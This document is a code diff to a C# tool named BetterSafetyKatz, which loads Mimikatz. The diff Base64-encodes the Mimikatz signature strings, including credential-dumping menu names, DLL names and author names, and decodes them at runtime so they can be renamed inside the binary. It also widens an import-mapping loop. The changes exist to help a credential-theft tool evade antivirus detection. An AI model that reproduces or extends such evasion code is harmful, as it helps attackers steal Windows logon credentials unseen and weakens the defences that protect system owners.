@@ -99,60 +99,61 @@ namespace BetterSafetyKatz
 
                 //Stuff that might have signatures, but that we can give random names (Menu stuff)
                 var stringsToSlightlyObfuscate = new string[] {
-                  "logonPasswords",
-                  "credman",
+                  "bG9nb25QYXNzd29yZHM=",
+                    "Y3JlZG1hbg==",
             };
 
                 //In-code strings that we can give random names
                 var stringsToRandomlyObfuscate = new string[] {
-                "SamQueryInformationUser",
-                "SamOpenUser",
-                "Lists all available providers credentials",
-                "Switch (or reinit) to LSASS process  context",
-                "Lists LiveSSP credentials",
-                "mimikatz",
-                "NetworkCleartext",
-                "Service",
-                "Proxy",
-                "PathCombine",
-                "Batch",
-                "Unlock",
-                "Network",
-                "Unknown !",
-                "Interactive",
-                "Service",
-                "UndefinedLogonType",
-                "List Credentials Manager",
-                "dpapisrv.dll",
-                "multirdp",
-                "[experimental] patch Terminal Server service to allow multiples users",
-                "DumpCreds",
-                "livessp.dll",
-                "wdigest.dll",
-                "kerberos.dll",
-                "termsrv.dll",
-                "terFromArgs",
-                "/sam or /sid to target the account is needed",
-                "CERT_NCRYPT_KEY_SPEC",
-                "Kiwi",
-                "KiwiAndCMD",
-                "CryptAcquireCertificatePrivateKey",
-                "ERROR",
-                "ArgumentPtr",
-                "CallDllMainSC1",
-                "gentilkiwi",
-                "A La Vie, A L'Amour",
-                "vincent.letoux@gmail.com",
-                "oe.eo",
-                "benjamin",
-                "Benjamin DELPY",
-                "http://pingcastle.com",
-                "http://mysmartlogon.com",
-                "Vincent LE TOUX" };
+               "U2FtUXVlcnlJbmZvcm1hdGlvblVzZXI=",
+                "U2FtT3BlblVzZXI=",
+                "TGlzdHMgYWxsIGF2YWlsYWJsZSBwcm92aWRlcnMgY3JlZGVudGlhbHM=",
+                "U3dpdGNoIChvciByZWluaXQpIHRvIExTQVNTIHByb2Nlc3MgIGNvbnRleHQ=",
+                "TGlzdHMgTGl2ZVNTUCBjcmVkZW50aWFscw==",
+                "bWltaWthdHo=",
+                "TmV0d29ya0NsZWFydGV4dA==",
+                "U2VydmljZQ==",
+                "UHJveHk=",
+                "UGF0aENvbWJpbmU=",
+                "QmF0Y2g=",
+                "VW5sb2Nr",
+                "TmV0d29yaw==",
+                "VW5rbm93biAh",
+                "SW50ZXJhY3RpdmU=",
+                "U2VydmljZQ==",
+                "VW5kZWZpbmVkTG9nb25UeXBl",
+                "TGlzdCBDcmVkZW50aWFscyBNYW5hZ2Vy",
+                "ZHBhcGlzcnYuZGxs",
+                "bXVsdGlyZHA=",
+                "W2V4cGVyaW1lbnRhbF0gcGF0Y2ggVGVybWluYWwgU2VydmVyIHNlcnZpY2UgdG8gYWxsb3cgbXVsdGlwbGVzIHVzZXJz",
+                "RHVtcENyZWRz",
+                "bGl2ZXNzcC5kbGw=",
+                "d2RpZ2VzdC5kbGw=",
+                "a2VyYmVyb3MuZGxs",
+                "dGVybXNydi5kbGw=",
+                "dGVyRnJvbUFyZ3M=",
+                "L3NhbSBvciAvc2lkIHRvIHRhcmdldCB0aGUgYWNjb3VudCBpcyBuZWVkZWQ=",
+                "Q0VSVF9OQ1JZUFRfS0VZX1NQRUM=",
+                "S2l3aQ==",
+                "S2l3aUFuZENNRA==",
+                "Q3J5cHRBY3F1aXJlQ2VydGlmaWNhdGVQcml2YXRlS2V5",
+                "RVJST1I=",
+                "QXJndW1lbnRQdHI=",
+                "Q2FsbERsbE1haW5TQzE=",
+                "Z2VudGlsa2l3aQ==",
+                "QSBMYSBWaWUsIEEgTCdBbW91cg==",
+                "dmluY2VudC5sZXRvdXhAZ21haWwuY29t",
+                "b2UuZW8=",
+                "YmVuamFtaW4=",
+                "QmVuamFtaW4gREVMUFk=",
+                "aHR0cDovL3BpbmdjYXN0bGUuY29t",
+                "aHR0cDovL215c21hcnRsb2dvbi5jb20=",
+                "VmluY2VudCBMRSBUT1VY"
+                };
 
-
+              
                 //Give random names
-                foreach (var sigString in stringsToRandomlyObfuscate)
+                foreach (var sigString in stringsToRandomlyObfuscate.Select(x => Encoding.UTF8.GetString(Convert.FromBase64String(x))))
                 {
                     string hexReplace = BitConverter.ToString(Encoding.Unicode.GetBytes(sigString)).Replace("-", string.Empty);
 
@@ -161,7 +162,7 @@ namespace BetterSafetyKatz
                     hexCats = hexCats.Replace(hexReplace, newData);
                 }
 
-                foreach (var menuString in stringsToSlightlyObfuscate)
+                foreach (var menuString in stringsToSlightlyObfuscate.Select(x => Encoding.UTF8.GetString(Convert.FromBase64String(x))))
                 {
 
                     string hexReplace = BitConverter.ToString(Encoding.UTF8.GetBytes(menuString)).Replace("-", string.Empty);
@@ -273,7 +274,7 @@ namespace BetterSafetyKatz
                  * */
                 Console.WriteLine("[+] Mapping DLL Ptrs into memory, but doing it sloooooowly (10 sec tops)");
 
-                for (int j = 0; j < 28; j++)
+                for (int j = 0; j < 9999; j++)
                 {
                     IntPtr a1 = (IntPtr)((long)(codebase.ToInt64() + (uint)(20 * j) + (uint)pe.OptionalHeader64.ImportTable.VirtualAddress));
                     int entryLength = Marshal.ReadInt32((IntPtr)(((long)a1.ToInt64() + (long)16)));
